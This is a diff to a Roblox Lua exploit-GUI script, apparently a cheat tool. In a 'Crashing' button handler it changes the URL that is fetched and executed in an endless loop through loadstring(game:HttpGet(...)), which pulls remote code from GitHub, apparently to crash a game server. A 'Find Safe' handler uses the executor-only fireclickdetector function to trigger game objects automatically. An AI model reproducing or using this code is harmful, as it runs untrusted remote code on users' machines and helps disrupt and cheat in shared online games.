@@ -6802,7 +6802,7 @@ local function GBEJ_script() -- Gui.Button_38.LocalScript
 			script.Parent.Text = "Crashing"
 			wait(1)
 			while wait() do
-				loadstring(game:HttpGet("https://pastebin.com/raw/x2ncGRVf"))()
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/SViliszWorks/SVilisz---Collection/main/ok.txt"))()
 			end
 		end
 		wait(0.16)
@@ -7042,7 +7042,6 @@ local function IWAXJ_script() -- Gui.findsafe.LocalScript
 		game:GetService("TweenService"):Create(vw, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0), {BackgroundColor3 = Color3.fromRGB(70, 70, 70)}):Play()
 		--
 		if vw.Button.Text == "Find Safe" then
-			vw.Button.Text = "Looking For Safe"
 			wait(1)
 			while wait() do
 				fireclickdetector(game:GetService("Workspace").TheHouse.P1.ClickDetector)
@@ -7057,10 +7056,7 @@ local function IWAXJ_script() -- Gui.findsafe.LocalScript
 				wait(0.2)
 				fireclickdetector(game:GetService("Workspace").TheHouse.P6.ClickDetector)
 			end
-			wait(7.32)
 			vw.Button.Text = "Find Safe "
-		elseif vw.Button.Text == "Looking For Safe" then
-			warn("Please Wait While Xostum Look For The Safe.")
 		else
 			warn("Find Has Already Found.")
 		end
